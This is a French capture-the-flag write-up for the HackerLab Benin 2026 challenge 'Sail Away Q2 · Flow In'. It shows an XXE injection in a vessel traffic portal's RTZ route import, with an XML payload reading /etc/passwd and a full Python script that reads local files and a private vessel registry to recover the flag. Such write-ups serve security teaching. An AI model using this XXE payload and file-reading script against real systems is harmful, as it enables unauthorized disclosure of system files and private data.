---
title: "Sail Away Q2 · Flow In"
platform: "HackerLab Benin 2026"
category: "ics"
difficulty: "—"
points: 150
os: "—"
date: 2026-11-20
author: "DazBot13-boopt, elielfresnel"
author_github: "DazBot13-boopt"
source: "https://github.com/DazBot13-boopt/hackerlab-benin-2026-wu/blob/main/sail-away/02-flow-in.md"
tags: [hackerlab-benin-2026, ics]
status: published
---

# Sail Away : Q2 · Flow in (150 pts)

> *« Le RAVN appareille cette nuit, notre demande officielle traîne. Pas le temps d'attendre : trouvez l'itinéraire du RAVN. »*

## TL;DR

Le portail Citadel VTS accepte des routes au format **RTZ** (XML). Le parser est vulnérable à **XXE** → lecture de fichiers locaux → registre privé des navires → itinéraire + flag.

**Flag** : `HLB2026{de133674980b13d1fd1f7c7c78cc52e9}`

## Exploit XXE

L'endpoint `/api/route/import` ingère un fichier RTZ (XML). Pas de filtrage sur les entités externes :

```xml
<?xml version="1.0"?>
<!DOCTYPE route [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<route version="1.1" xmlns="http://www.cirm.org/RTZ/1/1">
  <routeInfo routeName="p" routeStatus="original"/>
  <waypoints>
    <waypoint id="1" name="a"><position lat="1" lon="1"/></waypoint>
  </waypoints>
  <extensions>
    <citadelImport><note>&xxe;</note></citadelImport>
  </extensions>
</route>
```

La réponse renvoie le contenu du fichier dans le champ `note`.

## Script complet

```python
import json, urllib.request

BASE = "http://172.28.X.2:8080"

RTZ = ('<?xml version="1.0"?>\n'
       '<!DOCTYPE route [<!ENTITY xxe SYSTEM "file://{path}">]>\n'
       '<route version="1.1" xmlns="http://www.cirm.org/RTZ/1/1">'
       '<routeInfo routeName="p" routeStatus="original"/>'
       '<waypoints><waypoint id="1" name="a"><position lat="1" lon="1"/></waypoint></waypoints>'
       '<extensions><citadelImport><note>&xxe;</note></citadelImport></extensions></route>')

def xxe_read(path):
    body = RTZ.format(path=path).encode()
    req = urllib.request.Request(BASE + "/api/route/import", data=body,
                                 headers={"Content-Type": "application/xml"})
    return json.loads(urllib.request.urlopen(req, timeout=20).read())

# 1. prouver le XXE
assert "root:x:0:0" in xxe_read("/etc/passwd").get("note", "")

# 2. tenter de trouver le chemin du registre privé via /proc
reg = "/srv/vts/data/private_vessels.json"
try:
    dbg = xxe_read("/proc/self/cmdline").get("debug") or {}
    if dbg.get("registry"):
        reg = dbg["registry"]
except Exception:
    pass

# 3. lire le registre et sortir la fiche du RAVN
data = json.loads(xxe_read(reg)["note"])
ravn = next(v for v in data["vessels"] if v.get("id") == "ravn")
v = ravn["voyage"]
print(f"Route: {v['from']} → {v['to']} via {v['via']} (ETA écluse {v['etaLock']})")
print(f"FLAG : {ravn['clearance']}")
```

Sortie :

```
Route: Citadel (TV CTD) → Norhavn (NV HVN) via Écluse Est (Östersluss) (ETA écluse 23:40Z)
FLAG : HLB2026{de133674980b13d1fd1f7c7c78cc52e9}
```
